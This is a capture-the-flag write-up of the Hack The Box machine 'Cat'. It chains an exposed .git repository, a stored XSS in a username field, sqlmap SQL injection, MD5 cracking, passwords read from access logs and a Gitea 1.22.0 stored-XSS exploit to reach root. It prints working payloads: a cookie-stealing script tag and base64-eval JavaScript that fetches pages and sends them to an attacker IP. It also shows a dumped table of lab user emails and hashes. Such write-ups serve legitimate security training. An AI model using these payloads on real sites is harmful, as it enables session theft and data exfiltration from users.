+++
title = "HTB - Cat"
date = "2025-05-09"
author = "dax"
cover = ""
tags = ["xss", "sqli", "hashcat", "gitea"]
keywords = ["hacking", "htb", "cat", "hack the box"]
description = "Write-up of Hack The Box medium machine Cat"
showFullContent = false
readingTime = true
hideComments = false
color = "green"
+++

# HTB - Cat

## Enumeration:

```bash
# Nmap 7.95 scan initiated Tue Apr  8 14:24:34 2025 as: /usr/lib/nmap/nmap -v -p - -Pn -T4 -A -oN nmaptcp cat.htb
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git:
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Best Cat Competition
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Aggressive OS guesses: Linux 4.15 - 5.19 (98%), Linux 5.0 (94%), Linux 5.0 - 5.14 (94%), Linux 3.2 - 4.14 (94%), Linux 4.15 (94%), Linux 2.6.32 - 3.10 (93%), OpenWrt 21.02 (Linux 5.4) (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%), Linux 2.6.32 (92%), Linux 5.10 - 5.15 (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 19.218 days (since Thu Mar 20 09:11:09 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   22.52 ms 10.10.14.1
2   22.66 ms cat.htb (10.10.11.53)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  8 14:25:01 2025 -- 1 IP address (1 host up) scanned in 27.23 seconds
```

## User exploit

Looking at the nmap scan, we see only two ports open: 22 (SSH) and 80 (web). The web port hosts is a PHP application to post cat pictures for a contest. We can start by running `gobuster` to see if we can find any interesting files.

```bash
$ gobuster dir -u http://cat.htb -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cat.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3075]
/admin.php            (Status: 302) [Size: 1] [--> /join.php]
/config.php           (Status: 200) [Size: 1]
/logout.php           (Status: 302) [Size: 0] [--> /]
/.htaccess            (Status: 403) [Size: 272]
/vote.php             (Status: 200) [Size: 1242]
/.                    (Status: 200) [Size: 3075]
/.html                (Status: 403) [Size: 272]
/.php                 (Status: 403) [Size: 272]
/join.php             (Status: 200) [Size: 4004]
/.htpasswd            (Status: 403) [Size: 272]
/.htm                 (Status: 403) [Size: 272]
/.git                 (Status: 301) [Size: 301] [--> http://cat.htb/.git/]
/.htpasswds           (Status: 403) [Size: 272]
/.htgroup             (Status: 403) [Size: 272]
/wp-forum.phps        (Status: 403) [Size: 272]
/contest.php          (Status: 302) [Size: 1] [--> /join.php]
/.htaccess.bak        (Status: 403) [Size: 272]
/.htuser              (Status: 403) [Size: 272]
/.ht                  (Status: 403) [Size: 272]
/.htc                 (Status: 403) [Size: 272]
/winners.php          (Status: 200) [Size: 5082]
/.htaccess.old        (Status: 403) [Size: 272]
/.htacess             (Status: 403) [Size: 272]
/view_cat.php         (Status: 302) [Size: 1] [--> /join.php]
Progress: 37050 / 37051 (100.00%)
===============================================================
Finished
===============================================================
```

We find a few, but the one we're interested in is `.git/`. We can use `GitTools` to extract the git content of the folder to access the source code of the application.

```bash
# Download the content of the .git folder
$ bash gitdumper.sh http://cat.htb/.git/ ../cat_dmp/

# Extract the commit files from it
$ bash extractor.sh ../cat_dmp/ ../cat_ext/
```

We find a single commit, `0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5`, that contains the complete source code for the PHP application. Quickly looking at the code, we find two interesting informations.

First, the `config.php` tells use that we are using a SQLite database (`/databases/cat.db`).

```php
<?php
// Database configuration
$db_file = '/databases/cat.db';

// Connect to the database
try {
    $pdo = new PDO("sqlite:$db_file");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error: " . $e->getMessage());
}
?>
```

Second, by looking at all the SQL queries, we find a single one that passes user input directly to `$pdo->exec()` without any sanitization in `accept_cat.php`.

```php
...
if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);
...
```

Unfortunately, the page requires to be authenticated as `axel`, or else we get an `Access denied.`. Time to poke around the app itself. We use the registration page to create an account, and we find a cat submission form in the `Contests` page. Once submitted, we get a message that hints that a user will review our application, hinting for an XSS.

![](/img/htb/cat/contest_form.png)

![](/img/htb/cat/contest_form_submit.png)

Looking at the source code for `contest.php`, we find that there is pretty heavy sanitization of all the parameters in the query, so no luck there.

```php
...
// Check for forbidden content
if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
    contains_forbidden_content($age, $forbidden_patterns) ||
    contains_forbidden_content($birthdate, $forbidden_patterns) ||
    contains_forbidden_content($weight, $forbidden_patterns)) {
    $error_message = "Your entry contains invalid characters.";
} else {
    // Generate unique identifier for the image
    $imageIdentifier = uniqid() . "_";

    // Upload cat photo
    $target_dir = "uploads/";
    $target_file = $target_dir . $imageIdentifier . basename($_FILES["cat_photo"]["name"]);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Check if the file is an actual image or a fake file
...
```

However, we can spot one additional parameter that is under our control that is not restricted by such sanitization: our username!

```php
...
$stmt->bindParam(':cat_name', $cat_name, PDO::PARAM_STR);
$stmt->bindParam(':age', $age, PDO::PARAM_INT);
$stmt->bindParam(':birthdate', $birthdate, PDO::PARAM_STR);
$stmt->bindParam(':weight', $weight, PDO::PARAM_STR);
$stmt->bindParam(':photo_path', $target_file, PDO::PARAM_STR);
$stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
...
```

All of this information is then output in the `view_cat.php` page.

```php
...
<div class="cat-info">
    <strong>Name:</strong> <?php echo $cat['cat_name']; ?><br>
    <strong>Age:</strong> <?php echo $cat['age']; ?><br>
    <strong>Birthdate:</strong> <?php echo $cat['birthdate']; ?><br>
    <strong>Weight:</strong> <?php echo $cat['weight']; ?> kg<br>
    <strong>Owner:</strong> <?php echo $cat['username']; ?><br>
    <strong>Created At:</strong> <?php echo $cat['created_at']; ?>
</div>
...
```

We can also confirm that there is no sanitization going on when we register in the `join.php` page, so we have a winner for our XSS target. Let's spin up `XSS-Catcher`, create a client and generate a payload to capture the admin's session cookie. We create a new user by putting our payload in the username field, and submit a cat once again. About a minute later, we get a hit back in `XSS-Catcher`.

![](/img/htb/cat/xss_catcher_cookie.png)

Armed with axel's cookie, we can now exploit the SQLi vulnerability that we spotted earlier using `sqlmap`. We intercept the POST request to the `accept_cat.php` form, save the request to a file and fire up `sqlmap`.

```bash
$ python sqlmap.py -r req.txt -p catName --risk=2 --level=5 --dbms=SQlite --tables
$ python sqlmap.py -r req.txt -p catName --risk=2 --level=5 --dbms=SQlite -T users --dump
```

```csv
user_id,email,password,username
1,axel2017@gmail.com,d1bbba3670feb9435c9841e46e60ee2f,axel
2,rosamendoza485@gmail.com,ac369922d560f17d6eeb8b2c7dec498c,rosa
3,robertcervantes2000@gmail.com,42846631708f69c00ec0c0a8aa4a92ad,robert
4,fabiancarachure2323@gmail.com,39e153e825c4a3d314a0dc7f7475ddbe,fabian
5,jerrysonC343@gmail.com,781593e060f8d065cd7281c5ec5b4b86,jerryson
6,larryP5656@gmail.com,1b6dce240bbfbc0905a664ad199e18f8,larry
7,royer.royer2323@gmail.com,c598f6b844a36fa7836fba0835f1f6,royer
8,peterCC456@gmail.com,e41ccefa439fc454f7eadbf1f139ed8a,peter
9,angel234g@gmail.com,24a8ec003ac2e1b3c5953a6f95f8f565,angel
10,jobert2020@gmail.com,88e4dceccd48820cf77b5cf6c08698ad,jobert
11,dax1@test.com,2c103f2c4ed1e59c0b4e2e01821770fa,"'>""><script>new Image().src=""http://10.10.14.21:8888/api/x/s/ujo1m8?cookies=""+encodeURIComponent(document.cookie)</script>"
```

The recovered hashes are `md5` so we can easily crack them using hashcat to recover the password of the `rosa` user.

```bash
$ ./hashcat -m 0 cat.hashes rockyou.txt
```

We can then use the credentials to log into the SSH port, but this does not give us the user flag yet. After running the enumeration script of your choice (in my case `LinPeas`), we see that rosa is part of the `adm` group. The `adm` group usually has access to log files that are in `/var/log/` and such. This includes the `/var/log/apache2/access.log` file, which we can grep for `axel`. Since the login request for the app is made using GET instead of POST, and that we know that the axel user is frequently used to trigger the XSS vulnerability, we see a bunch of logs containing his password.

```
$ grep axel access.log
...
127.0.0.1 - - [10/May/2025:13:16:41 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [10/May/2025:13:16:52 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [10/May/2025:13:17:03 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [10/May/2025:13:17:13 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```

We can now use these new credentials to log into the SSH port and get the user flag.

## Root exploit

Now connected as `axel`, we can have a look around. Looking at our previous `LinPeas` script output, we see that the `axel` user has two mails from `rosa` in `/var/mail/axel`.

```
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
```

```
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

Interesting, this seems to hint at another XSS. We'll use SSH to forward port 3000 that listens only on 127.0.0.1 since it is mentioned in the mail. We will also forward port 25 and 587, since the mail also talks about sending an email.

```bash
$ ssh axel@cat.htb -L 3000:127.0.0.1:3000 -L 25:127.0.0.1:25 -L 587:127.0.0.1:587
```

By accessing port 3000 with our web browser, we can see a `Gitea` server (a self hosted alternative to Github). We can log in using axel's credentials, but there is pretty much no content at all. At the bottom of the page in the footer, we can see that the version of `Gitea` is `v1.22.0`. If we search Google for potential vulnerabilities, we find `CVE-2024-6886`, a stored XSS in the description field of a `Gitea` project. The exploit is pretty straight forward: create a new repository (be sure to check `Initialize Repository (Adds .gitignore, License and README)` or else the description field won't show up), and in the description field put a malicious link (ex: `<a href=javascript:alert()>XSS test</a>`). When the link is clicked, the payload will fire.

This seems to perfectly align with what the mail was telling us about, so let's craft a payload that will get the content of the `administrator/Employee-management` repository. The payload will consist of a few layers. First, we create some JavaScript that can fetch the content of a page and send it back to `XSS-Catcher`.

```javascript
async function fetchEncodeAndSend(sourceUrl, targetUrl) {
  const response = await fetch(sourceUrl);
  const text = await response.text();
  const encodedContent = btoa(unescape(encodeURIComponent(text)));
  await fetch(targetUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: encodedContent }),
  });
}
fetchEncodeAndSend(
  "http://localhost:3000/administrator/Employee-management",
  "http://10.10.14.18:8888/api/x/s/bXm2IT",
);
```

We will minify and encode it in base64, and wrap it in a base64 decode statement and an eval statement. Finally, we will put it in a link HTML tag.

```
<a href="javascript:eval(atob('YXN5bmMgZnVuY3Rpb24gZmV0Y2hFbmNvZGVBbmRTZW5kKHNvdXJjZVVybCx0YXJnZXRVcmwpe2NvbnN0IHJlc3BvbnNlPWF3YWl0IGZldGNoKHNvdXJjZVVybCk7Y29uc3QgdGV4dD1hd2FpdCByZXNwb25zZS50ZXh0KCk7Y29uc3QgZW5jb2RlZENvbnRlbnQ9YnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQodGV4dCkpKTthd2FpdCBmZXRjaCh0YXJnZXRVcmwse21ldGhvZDoiUE9TVCIsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSxib2R5OkpTT04uc3RyaW5naWZ5KHtjb250ZW50OmVuY29kZWRDb250ZW50fSl9KX1mZXRjaEVuY29kZUFuZFNlbmQoImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hZG1pbmlzdHJhdG9yL0VtcGxveWVlLW1hbmFnZW1lbnQiLCJodHRwOi8vMTAuMTAuMTQuMTg6ODg4OC9hcGkveC9zL2JYbTJJVCIsKTs='))">Click me</a>
```

Now the following actions have to be executed pretty quickly, since the `Gitea` server seems to clean up all repositories every 2 minutes or so. The exploit goes as follows:

```bash
# 1. Create a new repo, check the initialization checkbox and put the payload in the description field.

# 2. Send a mail to `jobert`. Since we forwarded port 25 and 587 to our machine, `sendemail` will use these by default.
# For the message, you can simply take the mail sent by rosa and replace the URL by the one for your new repo.
$ sendemail -f axel@cat.htb -t jobert@localhost -u "Employee management" -m "$(cat message.txt)"

# 3. XSS-Catcher should receive a base64 encoded version of the page you fetched.
# Simply decode it to view the content.
```

The recovered page should contain the list of files at the root of the repository, and we can spot the `index.php` file that looks promising. We can execute the same exploit to get the content of `http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php` this time.

The recovered PHP file will contain credentials for an `admin` user, which allow us to log into SSH as the root user and get the root flag.

## Resources:

| Hyperlink                                      | Info                      |
| ---------------------------------------------- | ------------------------- |
| https://github.com/OJ/gobuster                 | Gobuster                  |
| https://github.com/internetwache/GitTools      | GitTools                  |
| https://github.com/daxAKAhackerman/XSS-Catcher | XSS-Catcher               |
| https://github.com/sqlmapproject/sqlmap        | sqlmap                    |
| https://github.com/hashcat/hashcat             | hashcat                   |
| https://github.com/peass-ng/PEASS-ng           | PEASS-ng                  |
| https://github.com/go-gitea/gitea              | Gitea                     |
| https://www.exploit-db.com/exploits/52077      | Gitea 1.22.0 - Stored XSS |
